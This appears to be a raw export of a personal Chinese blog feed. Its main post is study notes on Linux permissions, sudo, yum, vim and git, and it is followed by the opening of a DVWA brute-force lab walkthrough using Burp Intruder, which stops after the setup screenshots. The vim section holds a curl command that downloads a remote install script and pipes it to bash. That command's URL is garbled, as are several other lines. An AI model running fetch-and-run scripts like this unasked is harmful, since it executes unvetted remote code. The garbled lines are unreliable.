href="#Linux权限管理" class="headerlink" title="Linux权限管理"></a>Linux权限管理</h3><h4 id="文件访问者的分类"><a href="#文件访问者的分类" class="headerlink" title="文件访问者的分类"></a>文件访问者的分类</h4><ul><li>文件和文件目录的所有者:u—User</li><li>文件和文件目录的所有者所在的组的用户g—Group </li><li>其它用户:o—Others(外国人)</li></ul><h4 id="文件类型和访问权限（事务属性）"><a href="#文件类型和访问权限（事务属性）" class="headerlink" title="文件类型和访问权限（事务属性）"></a>文件类型和访问权限（事务属性）</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20231101185252874.png" alt="image-20231101185252874"></p><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><ul><li>d:文件夹-︰普通文件</li><li>1∶软链接（类似windows的快捷方式)</li><li>b:块设备文件（例如硬盘、光驱等)</li><li>p:管道文件</li><li>c:字符设备文件（例如屏幕等串口设备)</li><li>s:套接口文件</li></ul><h4 id="file指令"><a href="#file指令" class="headerlink" title="file指令"></a>file指令</h4><p>功能说明：辨识文件类型</p><p>语法：file [选项] 文件或目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost home]$ cd youzipii/</span><br><span class="line">[youzipii@localhost ~]$ file ../youzipii/</span><br><span class="line">../youzipii/: directory</span><br><span class="line">[youzipii@localhost ~]$ file youzipii.txt</span><br><span class="line">youzipii.txt: empty</span><br><span class="line">[youzipii@localhost ~]$ echo &quot;www.baidu.com&quot; &gt;&gt; youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ file youzipii.txt</span><br><span class="line">youzipii.txt: ASCII text</span><br></pre></td></tr></table></figure><h4 id="基本权限设置"><a href="#基本权限设置" class="headerlink" title="基本权限设置"></a>基本权限设置</h4><ul><li>读（r&#x2F;4) : Read对文件而言，具有读取文件内容的权限;对目录来说，具有浏览该目录信息的权限</li><li>写(w&#x2F;2) : Write对文件而言，具有修改文件内容的权限;对目录来说具有删除移动目录内文件的权限</li><li>执行(x&#x2F;1) : execute对文件而言，具有执行文件的权限;对目录来说，具有进入目录的权限</li><li>“—“表示不具有该项权限</li></ul><h4 id="文件权限值得表示方法"><a href="#文件权限值得表示方法" class="headerlink" title="文件权限值得表示方法"></a>文件权限值得表示方法</h4><p>字符表示方法</p><table><thead><tr><th>Linux表示</th><th>说明</th><th>Linux表示</th><th>说明</th></tr></thead><tbody><tr><td>r–</td><td>只读</td><td>-w-</td><td>仅可写</td></tr><tr><td>–x</td><td>仅可执行</td><td>rw-</td><td>读可写</td></tr><tr><td>-wx</td><td>可写和执行</td><td>r-x</td><td>可读可执行</td></tr><tr><td>rwx</td><td>可读可写可执行</td><td>—</td><td>无权限</td></tr></tbody></table><table><thead><tr><th>权限符号</th><th>八进制</th><th>二进制</th></tr></thead><tbody><tr><td>r</td><td>4</td><td>100</td></tr><tr><td>w</td><td>2</td><td>010</td></tr><tr><td>x</td><td>1</td><td>001</td></tr><tr><td>rw</td><td>6</td><td>110</td></tr><tr><td>rx</td><td>5</td><td>101</td></tr><tr><td>wx</td><td>3</td><td>011</td></tr><tr><td>rwx</td><td>7</td><td>111</td></tr><tr><td>—</td><td>0</td><td>000</td></tr></tbody></table><h4 id="文件权限访问得相关设置方法"><a href="#文件权限访问得相关设置方法" class="headerlink" title="文件权限访问得相关设置方法"></a>文件权限访问得相关设置方法</h4><h5 id="chmod功能：设置访问权限"><a href="#chmod功能：设置访问权限" class="headerlink" title="chmod功能：设置访问权限"></a>chmod功能：设置访问权限</h5><p>格式：chmod [参数] 权限 文件明</p><p>常用选项：</p><ul><li>R-&gt;递归修改目录文件的权限</li><li>说明:只有文件的拥有者和root才可以改变文件的权限</li></ul><p><em>chmod命令权限值的格式</em></p><p>① 用户表示符 +&#x2F;-&#x3D;权限字符</p><ul><li>+:向权限范围增加权限代号所表示的权限</li><li>-:向权限范围取消权限代号所表示的权限</li><li>&#x3D;:向权限范围赋予权限代号所表示的权限</li><li>用户符号:</li><li>u:拥有者</li><li>g:拥有者同组者</li><li>o:其它用户</li><li>a:所有用户</li></ul><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod u-rw,g-rw,o-r youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">----------. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod u+w,a=x youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">---x--x--x. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br></pre></td></tr></table></figure><p>②三位8进制数字</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ chmod 000 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">----------. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod 664 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br></pre></td></tr></table></figure><h5 id="chown功能：修改文件拥有者"><a href="#chown功能：修改文件拥有者" class="headerlink" title="chown功能：修改文件拥有者"></a>chown功能：修改文件拥有者</h5><p>格式：chown [参数] 用户名，文件名</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># chown user1 f1</span><br><span class="line"># chwon -R user1 filegroup1</span><br></pre></td></tr></table></figure><h5 id="chgrp功能：修文件或目录所属组"><a href="#chgrp功能：修文件或目录所属组" class="headerlink" title="chgrp功能：修文件或目录所属组"></a>chgrp功能：修文件或目录所属组</h5><p>格式：chgrp [参数] 用户组名 文件名</p><p>常用选项： -R 递归修改文件或目录所属组</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># chgrp users /abc/f2</span><br></pre></td></tr></table></figure><h5 id="使用sudo分配权限"><a href="#使用sudo分配权限" class="headerlink" title="使用sudo分配权限"></a>使用sudo分配权限</h5><p>（1） 修改&#x2F;etc&#x2F;sudoers文件分配文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vi /etc/sudoer</span><br></pre></td></tr></table></figure><p>（2） 使用sudo调用授权命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost ~]$ sudo -u root whoami</span><br><span class="line">root</span><br><span class="line">...</span><br><span class="line">or</span><br><span class="line">...</span><br><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[sudo] password for youzipii:</span><br><span class="line">[youzipii@localhost ~]$ sudo whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><ul><li>可执行权限:如果目录没有可执行权限,则无法cd到目录中.</li><li>可读权限:如果目录没有可读权限,则无法用ls等命令查看目录中的文件内容.</li><li>可写权限:如果目录没有可写权限,则无法在目录中创建文件,也无法在目录中删除文件.</li></ul><p>换句话来讲,就是只要用户具有目录的写权限,用户就可以删除目录中的文件,而不论这个用户是否有这个文件的写权限.<br>这好像不太科学啊,我张三创建的一个文件,凭什么被你李四可以删掉?我们用下面的过程印证一下.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ sudo chmod 777 fortest</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwx. 2 root  root      6 Nov  1 04:38 fortest</span><br><span class="line">-rw-rw-r--. 1 user1 youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ls -ld fortest/</span><br><span class="line">drwxrwxrwx. 2 root root 6 Nov  1 04:38 fortest/</span><br><span class="line">[youzipii@localhost ~]$ cd fortest/</span><br><span class="line">[youzipii@localhost fortest]$ touch test.c</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c</span><br><span class="line">[youzipii@localhost fortest]$ sudo touch test_root.c</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c #普通用户</span><br><span class="line">-rw-r--r--. 1 root     root     0 Nov  1 04:41 test_root.c #超级用户</span><br><span class="line">[youzipii@localhost fortest]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost fortest]$ rm test_root.c</span><br><span class="line">rm: remove write-protected regular empty file ‘test_root.c’? y</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c #删除成功</span><br></pre></td></tr></table></figure><p>为了解决这个问题，Linux引入了粘滞位</p><h4 id="粘滞位-好文-https-blog-csdn-net-better1914-article-details-53943081"><a href="#粘滞位-好文-https-blog-csdn-net-better1914-article-details-53943081" class="headerlink" title="粘滞位[好文][https://blog.csdn.net/better1914/article/details/53943081]"></a>粘滞位[好文][<a href="https://blog.csdn.net/better1914/article/details/53943081]">https://blog.csdn.net/better1914/article/details/53943081]</a></h4><p>粘滞位（Stickybit），或粘着位。最常见的用法在目录上设置粘滞位，如此以来，只有目录内文件的所有者或者root才可以删除或移动该文件。如果不为目录设置粘滞位，任何具有该目录写和执行权限的用户都可以删除和移动其中的文件。在我们系统中，粘滞位一般用于&#x2F;tmp目录，以防止普通用户删除或移动其他用户的文件。<br>一个目录具有粘滞位，则在other的X位会表现为 t,或者T.大小写的区别在于，原来x位上有x权限，有了粘滞位则表现为t.否则，表现为T。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ ls -ld /tmp</span><br><span class="line">drwxrwxrwt. 30 root root 4096 Nov  1 04:04 /tmp</span><br></pre></td></tr></table></figure><p><em>删除用户是最好带上-r不然用户的home目录不会一起删除</em></p><h3 id="关于目录权限总结"><a href="#关于目录权限总结" class="headerlink" title="关于目录权限总结"></a>关于目录权限总结</h3><ul><li>目录的可执行权限是表示你可否在目录下执行命令。</li><li>如果目录没有-x权限，则无法对目录执行任何命令，甚至无法cd进入目,即使目录仍然有-r读权限（这个地方很容易犯错，认为有读权限就可以进入目录读取目录下的文件)</li><li>而如果目录具有-x权限，但没有-权限，则用户可以执行命令，可以cd进入目录。但由于没有目录的读权限</li><li>所以在目录下，即使可以执行ls命令，但仍然没有权限读出目录下的文档。</li></ul><h2 id="Linux软件包管理yum"><a href="#Linux软件包管理yum" class="headerlink" title="Linux软件包管理yum"></a>Linux软件包管理yum</h2><h3 id="什么时软件包"><a href="#什么时软件包" class="headerlink" title="什么时软件包"></a>什么时软件包</h3><ul><li>在Linux下安装软件,一个通常的办法是下载到程序的源代码,并进行编译,得到可执行程序.</li><li>但是这样太麻烦了，于是有些人把一些常用的软件提前编译好,做成软件包(可以理解成windows上的安装程序)放在一个服务器上,通过包管理器可以很方便的获取到这个编译好的软件包,直接进行安装.</li><li>软件包和软件包管理器,就好比”App”和”应用商店”这样的关系.</li><li>yum(Yellow dog Updater, Modified)是Linux下非常常用的一种包管理器.主要应用在Fedora, RedHat,Centos等发行版上.</li></ul><h3 id="关于rzsz"><a href="#关于rzsz" class="headerlink" title="关于rzsz"></a>关于rzsz</h3><p>这个工具用于windows机器和远端的Linux机器通过XShell传输文件.安装完毕之后可以通过拖拽的方式将文件上传过去.</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>关于yum的所有操作必须保证主机(虚拟机)网络畅通!可以通过 ping 指令验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping baidu.com</span><br></pre></td></tr></table></figure><p>ping命令是一个用来进行检测网络连通性的命令，我们目前主要会用就行，如果你不知道自己的主机有没有联网，可以试试ping</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost yum.repos.d]$ ping baidu.com -c 4</span><br><span class="line">PING baidu.com (110.242.68.66) 56(84) bytes of data.</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=1 ttl=128 time=56.8 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=2 ttl=128 time=56.2 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=3 ttl=128 time=57.3 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=4 ttl=128 time=56.1 ms</span><br><span class="line"></span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 3004ms</span><br><span class="line">rtt min/avg/max/mdev = 56.184/56.664/57.344/0.561 ms</span><br></pre></td></tr></table></figure><h3 id="查看软件包"><a href="#查看软件包" class="headerlink" title="查看软件包"></a>查看软件包</h3><p>通过yum list 命令可以罗列出当前一共有哪些软件包.由于包的数目可能非常之多，这里我们需要使用grep命令只筛选出我们关注的包.例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost yum.repos.d]$ yum list | grep lrzsz</span><br><span class="line">lrzsz.x86_64                                0.12.20-36.el7             @anaconda</span><br></pre></td></tr></table></figure><h4 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>软件包名称:主版本号.次版本号.源程序发行号-软件包的发行号.主机平台.cpu架构.</li><li>“x86_64”后缀表示64位系统的安装包, “i686”后缀表示32位系统安装包.选择包时要和系统匹配.”el7”表示操作系统发行版的版本.</li><li>“el7”表示的是centos7&#x2F;redhat7. “el6”表示centos6&#x2F;redhat6.</li><li>最后一列, base 表示的是”软件源”的名称,类似于”小米应用商店”,”华为应用商店”这样的概念.</li></ul><h3 id="如何安装软件"><a href="#如何安装软件" class="headerlink" title="如何安装软件"></a>如何安装软件</h3><p>通过yum,我们可以通过很简单的一条命令完成gcc的安装.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install lrzsz</span><br></pre></td></tr></table></figure><p>yum 会自动找到都有哪些软件包需要下载,这时候敲”y”确认安装.出现”complete”字样,说明安装完成.</p><h4 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>安装软件时由于需要向系统目录中写入内容，一般需要会do或者切到rool账户下才能完成.</li><li>yum安装软件只能一个装完了再装另一个.正在yum安装一个软件的过程中,如果再尝试用yum安装另外-个软件, yum会报错.</li></ul><h3 id="如何卸载软件"><a href="#如何卸载软件" class="headerlink" title="如何卸载软件"></a>如何卸载软件</h3><p>仍然是一条命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum remove lrzsz</span><br></pre></td></tr></table></figure><h3 id="换源-https-blog-csdn-net-xiaojin21cen-article-details-84726193"><a href="#换源-https-blog-csdn-net-xiaojin21cen-article-details-84726193" class="headerlink" title="[换源][https://blog.csdn.net/xiaojin21cen/article/details/84726193]"></a>[换源][<a href="https://blog.csdn.net/xiaojin21cen/article/details/84726193]">https://blog.csdn.net/xiaojin21cen/article/details/84726193]</a></h3><h2 id="vim与gcc使用"><a href="#vim与gcc使用" class="headerlink" title="vim与gcc使用"></a>vim与gcc使用</h2><p><img src="https://www.runoob.com/wp-content/uploads/2015/10/vi-vim-cheat-sheet-sch.gif" alt="img"></p><h3 id="vi-x2F-vim区别"><a href="#vi-x2F-vim区别" class="headerlink" title="vi&#x2F;vim区别"></a>vi&#x2F;vim区别</h3><p>vilvim的区别简单点来说，它们都是多模式编辑器，不同的是vim是vi的升级版本，它不仅兼容vi的所有指令，而且还有一些新的特性在里面。例如语法加亮，可视化操作不仅可以在终端运行，也可以运行于x window、mac os、windows。我们课堂上，统一按照vim来进行讲解。</p><h3 id="vim基本概念"><a href="#vim基本概念" class="headerlink" title="vim基本概念"></a>vim基本概念</h3><p>课堂上我们讲解vim的三种模式(其实有好多模式，目前掌握这3种即可),分别是命令模式(command mode)、插入模式(Insert mode)和底行模式弋(last line mode)，各模式的功能区分如下:</p><ul><li>正常&#x2F;普通&#x2F;命令模式(Normal mode)</li></ul><p><em>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到last line mode</em>·</p><ul><li>插入模式(Insert mode)</li></ul><p><em>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。该模式是我们后面用的最频繁的编辑模式。</em></p><ul><li>·末行模式(last line mode)</li></ul><p><em>文件保存或退出，也可以进行文件替换，找字符串，列出行号等操作。在命令模式下，shift+:即可进入该模式。要查看你的所有模式:打开vim，底行模式直接输入</em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:help vim-modes</span><br></pre></td></tr></table></figure><p>我这里一共有12种模式:six BASIC modes和six ADDITIONAL modes.</p><h3 id="vim基本操作"><a href="#vim基本操作" class="headerlink" title="vim基本操作"></a>vim基本操作</h3><ul><li><p>进入vim,在系统提示符号输入vim及文件名称后，就进入vim全屏幕编辑画面;</p><ul><li>$ vim test.c</li><li>不过有一点要特别注意，就是你进入vim之后，是处于[正常模式]，你要切换到[插入模式]才能够输入文字。</li></ul></li><li><p>[正常模式]切换至[插入模式]</p><ul><li>输入a 光标后移</li><li>输入i 不变</li><li>输入o 新起一行</li><li>输入s 但会删除当前光标所在的一个元素</li></ul></li><li><p>[插入模式]切换至[正常模式]</p><ul><li>目前处于[插入模式]，就只能一直输入文字，如果发现输错了字,想用光标键往回移动，将该字删除，可以先按一下「ESC」键转到[正常模式]再删除文字。当然，也可以直接删除。</li></ul></li><li><p>[正常模式]切换至[末行模式][shift +;」，其实就是输入「:」 退出vim及保存文件,在[正常模式]下，按一下「:」冒号键进入「Last line mode],例如:</p><ul><li>: w(保存当前文件)</li><li>: wq(输入「wq」,存盘并退出vim)</li><li>:q!(输入q!,不存盘强制退出vim)</li></ul></li></ul><h3 id="vim正常模式命令集（重要）"><a href="#vim正常模式命令集（重要）" class="headerlink" title="vim正常模式命令集（重要）"></a>vim正常模式命令集（重要）</h3><ul><li><p>插入模式</p><ul><li>·按「i」切换进入插入模式「insert mode]按”井入插入模式后是从光标当前位置开始输入文件;[重<br>要]</li><li>·按「a」进入插入模式后，是从目前光标d在位置的下一个位置开始输入文字;</li><li>·按「o」进入插入模式后，是括入新的一行，从行首开始输入文字。</li></ul></li><li><p>从插入模式切换为命令模式</p><ul><li>按「ESC」键。〔[重要]</li></ul></li><li><p>移动光标</p><ul><li>vim可以直接用键盘上的光标来上下左右移动，但正规的vim是用小写英文字母[h]、 [j]、 [k] 、[l]，分别控制光标左、下、上、右移一格</li><li>按[G]:移动到文章的最后〔重要]</li><li>按[$]:移动到光标所在行的”行尾”[重要]</li><li>按[^]:移动到光标所在行的“行首”[重要]</li><li>按[w]:光标跳到下个字的开头〔重要</li><li>按[e]:光标跳到下个字的字尾</li><li>按[b]︰光标回到上个字的开头[重要]</li><li>按[#]︰光标移到该行的第#个位置，如:5l,56l</li><li>按[gg]:进入到文本开始〔[重要]</li><li>按[shift+g]︰进入文本末端</li><li>按[ctrl]+[b]︰屏幕往”后”移动一页</li><li>按[ctrl]+ [f]︰屏幕往”前“移动一页</li><li>按[ctrl]+ [u]︰屏幕往”后”移动半页·</li><li>按[ctrl] + [d]︰屏幕往”前”移动半页</li></ul></li><li><p>删除文字</p><ul><li><p>.[x] : 每按一次，删除光标所在位置的一个字符〔重要]</p></li><li><p>[#x]︰例如，[6x]表示删除光标所在位置的”后面（包含自己在内)”6个字符</p></li><li><p>.[X] 大写的X，每按一次，删除光标所在位置的“前面”一个字符</p></li><li><p>.[#X]︰例如，[20X]表示删除光标所在位置的“前面”20个字符</p></li><li><p>.[dd]:删除光标所在行[重要]</p></li><li><p>[#dd] :从光标所在行开始删除#行[重要]</p></li><li><p>[yw]︰将光标所在之处到字尾的字符复制到缓冲区中。</p></li><li><p>.[#yw]:复制#个字到缓冲区</p></li><li><p>.[yy]:复制光标所在行到缓冲区。[重要]</p></li><li><p>.[#yy」 :例如,[6yy]表示拷贝从光标所在的该行”往下数”6行文字。</p></li><li><p>[p]︰将缓冲区内的字符贴到光标所在位置。注意:所有与”y”有关的复制命令都必须与”p”配合才能完成复制与粘贴功能。[重要]</p></li></ul></li><li><p>替换</p><ul><li>[r]︰替换光标所在处的字符。</li><li>.[R ]:香交元粽所至芝媒富拿es，直到接下 [ESC]</li></ul></li><li><p>销上一次操作</p><ul><li>[u]∶如果您误执行一个命令，可以马上按下0l<br>回到上、个操作。按多次“u”可以执行多次回复。<br>[重要]</li><li>.[ctrl+r]:撤销的恢复「[重要]</li></ul></li><li><p>更改</p><ul><li>.[c]:更改光标所在处到字尾处</li><li>.[c#w]︰例如，[c3w]表示更攻个字</li></ul></li><li><p>跳至指定的行</p><ul><li>[ctrl] + [g]: 列出光标所夺行的接往号。[重要]</li><li>[#G]︰例如，[15G]，表示移动光标至文章的第15行行首。</li></ul></li></ul><h3 id="vim末行模式命令集"><a href="#vim末行模式命令集" class="headerlink" title="vim末行模式命令集"></a>vim末行模式命令集</h3><p>在使用末行模式之前，请记住先按「ESC」键确定您已经处于正常模式，再按「:」冒号即可进入末行模式。</p><ul><li>列出行号<ul><li>[set nu] :输入[set nu]后，会在文件中的每一行前面列出行号。[重要]跳到文件中的某一行</li><li>[#] :[#]号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，如输入数字15，再<br>回车，就会跳到文章的第15行。</li></ul></li><li>查找字符<ul><li>[&#x2F;关键字]∶先按[&#x2F;]键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按[n]会往后寻找到您要的关键字为止。</li><li>[?关键字]︰先按[?]键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按[n]会往前寻找到您要的关键字为止。</li><li>问题:&#x2F;和?查找有和区别?操作实验一下</li></ul></li><li>保存文件[重要]<ul><li>.[w]:在冒号输入字母[w]就可以将文件保存起来</li></ul></li><li>离开vim[重要]<ul><li>[q]︰按[q]就是退出，如果无法离开vim，可以在「q」后跟一个[!]强制离开vim。</li><li>.[wq] :一般建议离开时，搭配[w]一起使用，这样在退出的时候还可以保存文件。</li></ul></li><li>两个桌面光标切换<ul><li>按住CTRL +两下w</li></ul></li><li>！+gcc&#x2F;man等命令<ul><li>例如！gcc test.c</li></ul></li></ul><h3 id="vim操作总结"><a href="#vim操作总结" class="headerlink" title="vim操作总结"></a>vim操作总结</h3><ul><li><p>三种模式</p><ul><li>正常模式</li><li>插入模式</li><li>底行模式</li></ul></li><li><p>vim操作</p><ul><li>打开，关闭，查看，查询，插入，删除，替换，撤销，复制等等操作。</li></ul></li></ul><h3 id="简单vim配置"><a href="#简单vim配置" class="headerlink" title="简单vim配置"></a>简单vim配置</h3><h4 id="自动配置-https-github-com-askunix-VimForCpp"><a href="#自动配置-https-github-com-askunix-VimForCpp" class="headerlink" title="[自动配置][https://github.com/askunix/VimForCpp]"></a>[自动配置][<a href="https://github.com/askunix/VimForCpp]">https://github.com/askunix/VimForCpp]</a></h4><p>保证自己联网的情况下，命令行直接运行，一键部署</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl - sLfhttps://gitee,conHGtz2222/vimForcpp/raw/master/insta1l.sh -o ./insta11.sh &amp;&amp; bash./install.sh</span><br></pre></td></tr></table></figure><h4 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h4><ul><li>在目录&#x2F;etcl下面，有个名为vimrc的文件，这是系统中公共的vim配置文件，对所有用户都有效。</li><li>而在每个用户的主目录下，都可以自己建立私有的配置文件，命名为: “.vimrc”。例如，&#x2F;root目录下，通常已经存在一个.vimrc文件,如果不存在，则创建之。</li><li>切换用户成为自己执行su，进入自己的主工作目录,执行cd ~</li><li>打开自己目录下的.vimrc文件，执行vim .vimrc</li></ul><h4 id="常用配置选项，用来测试"><a href="#常用配置选项，用来测试" class="headerlink" title="常用配置选项，用来测试"></a>常用配置选项，用来测试</h4><ul><li>设置语法高亮: syntax on</li><li>显示行号: set nu</li><li>设置缩进的空格数为4: set shiftwidth&#x3D;4</li></ul><h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h4><p>要配置好看的vim，原生的配置可能功能不全，可以选择安装插件来完善配置，保证用户是你要配置的用户，接下来:</p><ul><li>安装TagList插件,下载taglist_xx.zip ,解压完成，将解压出来的doc的内容放到<del>&#x2F;.vim&#x2F;doc,将解压出来的plugin下的内容拷贝到</del>l.vim&#x2F;plugin</li><li>在~&#x2F;.vimrc中添加: let Tlist_show_one_File&#x3D;1(let Tlist_Exit_on1ywindow&#x3D;1) letTlist_use_Right_window&#x3D;1</li><li>安装文件浏览器和窗口管理器插件: WinManager</li><li>下载winmanager.zip，2.x版本以上的</li><li>解压winmanager.zip，将解压出来的doc的内容放到<del>&#x2F;.vim&#x2F;doc,将解压出来的plugin下的内容拷贝到</del>&#x2F; .vim&#x2F;plugin</li><li>在~&#x2F;.vimrc中添加let g:winManagerwindowLayout&#x3D;‘FileExplorer|TagListnmap wm: wMToggle<cr></li><li>然后重启vim,打开<del>&#x2F;XXX.c或</del>&#x2F;XXX.cpp,在normal状态下输入”wm”,你将看到上图的效果。更具体移步:[点我][<a href="https://blog.csdn.net/wooin/article/details/1858917],%E5%85%B6%E4%BB%96%E6%89%8B%E5%86%8C%EF%BC%8C%E8%AF%B7%E6%89%A7%E8%A1%8Cvimtutor%E5%91%BD%E4%BB%A4%E3%80%82">https://blog.csdn.net/wooin/article/details/1858917],其他手册，请执行vimtutor命令。</a></li></ul><h3 id="vim参考资料-https-github-com-wsdjeg-vim-galore-zh-cn"><a href="#vim参考资料-https-github-com-wsdjeg-vim-galore-zh-cn" class="headerlink" title="[vim参考资料][https://github.com/wsdjeg/vim-galore-zh_cn]"></a>[vim参考资料][<a href="https://github.com/wsdjeg/vim-galore-zh_cn]">https://github.com/wsdjeg/vim-galore-zh_cn]</a></h3><h2 id="ubuntu中安装git"><a href="#ubuntu中安装git" class="headerlink" title="ubuntu中安装git"></a>ubuntu中安装git</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) youzipii@youzipii-virtual-machine:~$ git</span><br><span class="line">usage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value]</span><br><span class="line">           [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]</span><br><span class="line">           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]</span><br><span class="line">           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]</span><br><span class="line">           &lt;command&gt; [&lt;args&gt;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Linux编辑器-gcc-x2F-g-使用"><a href="#Linux编辑器-gcc-x2F-g-使用" class="headerlink" title="Linux编辑器-gcc&#x2F;g++使用"></a>Linux编辑器-gcc&#x2F;g++使用</h2>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA low</title>
      <link href="/2023/07/21/DVWA/"/>
      <url>/2023/07/21/DVWA/</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><em>资料大都参考自baynk，附上前辈博客<a href="https://baynk.blog.csdn.net/">连接</a></em></p><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>暴力破解</p><p><img src="https://img1.imgtp.com/2023/07/21/TTJVnQmj.png" alt="1.png"></p><h3 id="方法一：BURP（要用到一些常用密码的字典）"><a href="#方法一：BURP（要用到一些常用密码的字典）" class="headerlink" title="方法一：BURP（要用到一些常用密码的字典）"></a>方法一：BURP（要用到一些常用密码的字典）</h3><h4 id="打开代理"><a href="#打开代理" class="headerlink" title="打开代理"></a>打开代理</h4><p><img src="https://img1.imgtp.com/2023/07/21/MsL2UVvt.png" alt="2.png"></p><h4 id="输入账号，密码随便输，点击login"><a href="#输入账号，密码随便输，点击login" class="headerlink" title="输入账号，密码随便输，点击login"></a>输入账号，密码随便输，点击login</h4><p><img src="https://img1.imgtp.com/2023/07/21/R0ZISCmD.png" alt="3.png"></p><h4 id="此时BURP会抓到以下内容"><a href="#此时BURP会抓到以下内容" class="headerlink" title="此时BURP会抓到以下内容"></a>此时BURP会抓到以下内容</h4><p><img src="https://img1.imgtp.com/2023/07/21/3GXdBzXi.png" alt="4.png"></p><h4 id="发送到intruder"><a href="#发送到intruder" class="headerlink" title="发送到intruder"></a>发送到intruder</h4><p><img src="https://img1.imgtp.com/2023/07/21/EDcxZdHy.png" alt="5.png"></p><h4 id="配置好option"><a href="#配置好option" class="headerlink" title="配置好option"></a>配置好option</h4><p><img src="https://img1.imgtp.com/2023/07/21/EoNHNW08.png" alt="6.png"></p><h4 id="开始攻击"><a href="#开始攻击" 